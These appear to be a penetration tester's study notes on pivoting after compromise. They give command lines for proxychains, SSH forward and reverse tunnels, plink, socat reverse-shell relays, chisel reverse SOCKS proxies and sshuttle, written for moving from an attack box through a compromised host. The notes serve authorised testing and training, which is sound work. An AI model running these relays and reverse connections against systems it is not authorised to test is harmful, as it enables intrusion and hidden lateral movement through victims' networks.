proxychains 
	-non web traffic
	-scans are incredibly slow through it and should only be used as a last resort
	-command line tool
	-proxychains nc <ip> <port> for example
	-can read from multiple config files
		-first priority is ./proxychains.conf in current working directory
		-second is ~/.proxychains/proxychains.conf in home directory 
		-third and the master conf file is /etc/proxychains.conf
	-only tcp scans can be used
	-comment out proxy_dns if running scans
	-use -Pn switch for nmap scans, icmp will not work

foxy proxy for web traffic 

ssh tunneling/proxy
forward connections 
	-ssh -L <local port>:<target ip>:<target port> <user>@<ssh ip> -fN
		-fN tells the shell to background immediately and not to execute any commands
	-ssh -D <local port> <username>@<target ip> -fN 
		-this is to proxy all traffic through local port on your machine to the target 
		-useful when combined with proxychains
reverse connections
	-useful when you have a shell on victim but not SSH
	-can be riskier as this relies on accessing your attackbox from the victim machine
	-should always generate new ssh keys before attempting this
		-ssh-keygen 
		-edit the authorized_keys file in the .ssh folder with the following line 'command="echo 'This account can only be used for port 		forwarding'",no-agent-forwarding,no-x11-forwarding,no-pty'
		-add the newly generated key after
		-systemctl start ssh (starts ssh server)
	-once keys are generated and authorized_keys file is edited, transfer private key to victim box (ONLY TO BE DONE WITH THE RESTRCITED THROWAWAY KEYS GENERATED EARLIER!!!!)
	-ssh -R <local port>:<target ip>:<target port> <username>@<attacking ip> -i <key file> -fN
	

plink.exe
	-command line version of putty
	-valuable on older windows systems but modern versions ship with built-in ssh clients
	-cmd.exe /c echo y | .\plink.exe -R <local port>:<target ip>:<target port> <username>@<attacking ip> -i <key file> -N
		-cmd.exe /c echo y is used to bypass warning that target has not connected to this host before
		-keys generated by ssh-keygen will not work with plink.exe.  keys needs to be converted using puttygen
			-apt install putty-tools
			-puttygen <key file> -o <output file>.ppk
		-plink.exe can have compatibility issues with older versions
		-important to download latest version before engagement
			-https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html		

socat
reverse shell relay
	-powerful tool that is great for stabilizing linux shells and for port forwarding
	-drawback is rarely installed by default on systems
		-linux binary https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat	
		-windows binary https://sourceforge.net/projects/unix-utils/files/socat/1.7.3.2/socat-1.7.3.2-1-x86_64.zip/download	
			-windows binary will more than likely be flagged by av.  custom compliation will be necessary
	-can be used to create encrypted channels for port forwarding and relays
		-check out https://tryhackme.com/room/introtoshells	 for better examples
	-useful technique is to use socat as a relay on compromised server
		-socat listens for reverse shell from target machine and then relays back to attacking machine
		-set up netcat listener on attacking machine nc -lvnp <port>
		-use socat to start relay 
			./socat tcp-1:<local port> tcp:<attacking ip>:<listening port on attack> &
port forwarding quick
	-./socat tcp-1:<port on compromised server>,fork,reuseaddr tcp:<target ip>:<target port> &
		-opens up port on host
			-this allows us to communicate with the compromised host's port and forward traffic to the target ip and host
		-fork puts every connection into a new process
		-reuseaddr tells the port to stay open after connection is made to it
			-combined these options allow the same port forward to be used for more than one connection
port forwarding quiet
	-avoids opening up port on compromised server
	-socat tcp-1:<port 1> tcp-1:<port 2>,fork,reuseaddr & (run on attack machine)
		-local port relay
		-any connections to port 2 will be relayed to port 1
	-./socat tcp:<attack ip>:<port 1> tcp:<target ip>:<target port>,fork & (run on compromised host)
		-this will create a relay between port 1 on our machine and the target port on target server
	-for example if port 1 is 8001, port 2 is 8000 and target port is 80
		-http://localhost:8000 on attacking machine will forward traffic out port 8001
		-8001 is connected to socat process on compromised machine which then forwards traffic to port 80 on target machine
		-return traffic sent to socat process on compromised host which relays traffic back to port 8001 on attack machine
		-8001 is relayed locally to 8000

chisel
	-can be used to proxy or port forward with or without ssh access
	-https://github.com/jpillora/chisel/releases	
	-must have on both attacking machine and compromised machine
	-two modes, client and server
	-reverse SOCKS proxy
		-connects back from compromised machine
		-on attack machine
			-./chisel server -p <listening port> --reverse &
		-on compromised machine
			-./chisel client <attacking ip>:<listening port> R:socks &
		-will open a connection on 127.0.0.1:1080
	-forward SOCKs proxy
		-connects from attack machine to compromised host
			-less common than reverse proxies (egress rules are typically more lax than ingress)
		-on compromised host
			-./chisel server -p <listening port> --socks5
		-on attack box 
			-./chisel client <target ip>:<listen port> <proxy port>:socks5
				-<proxy port> hard sets the port that will be opened on attack box
		-if used with proxychains the proxychains conf files must be updated with port info
	-remote port forward
		-connects from compromised host to attack box
		-on attack box
			-./chisel server -p <listen port> --reverse &
		-on compromised host
			-./chisel client <attack box ip>:<listen port> R:<local port>:<target ip>:<target port> &
	-local port forward
		-connects from attack box to compromised host
		-on compromised host
			-./chisel server -p <listen port>
		-on attack box
			-./chisel client <listen ip>:<listen port> <local port>:<target ip>:<target port>

sshuttle
	-https://github.com/sshuttle/sshuttle	
	-functions more like a vpn than a port forward/proxy
	-uses ssh to create a tunneled proxy that acts like a new interface
	-can route traffic through proxy without needing a tool like proxychains
	-all traffic is encrypted (ssh)
	-requires ssh access to compromised host
	-requires python on compromised host
	-only compatible with linux hosts
	-sshuttle -r <user>@<ip> <subnet>
		-password based authentication
		-N switch can be used instead of specifying subnet.  this will attempt to create routes based on compromised host's route table
	-sshuttle -r <user>@<ip> --ssh-cmd “ssh -i <key file>” <subnet>
		-used for key based authentication
	sshuttle -r <user>@<ip> <subnet> -x <ip> 
		-use -x switch if host is in the subnet being routed
